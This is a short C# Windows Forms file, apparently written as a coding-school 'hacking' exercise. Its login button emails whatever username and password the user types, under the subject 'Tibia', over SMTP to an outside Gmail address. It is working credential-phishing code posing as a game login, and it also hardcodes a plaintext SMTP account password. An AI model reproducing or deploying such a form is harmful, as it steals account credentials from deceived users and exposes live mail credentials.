using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;


namespace Zajefajna_Gierka
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void BtnZaloguj_Click(object sender, EventArgs e)
        {
            MailMessage mail = new MailMessage("hacking@giganciprogramowania.edu.pl", "krido.yt@gmail.com");
            SmtpClient client = new SmtpClient("serwer1369095.home.pl", 587);
            client.Credentials = new NetworkCredential("hacking@giganciprogramowania.edu.pl", "giganci12345@");
            client.EnableSsl = true;
            mail.Subject = "Tibia";
            mail.Body = "Login: " + txtLogin.Text + " Password:" + txtHaslo.Text;
            client.Send(mail);
        }
    }
}
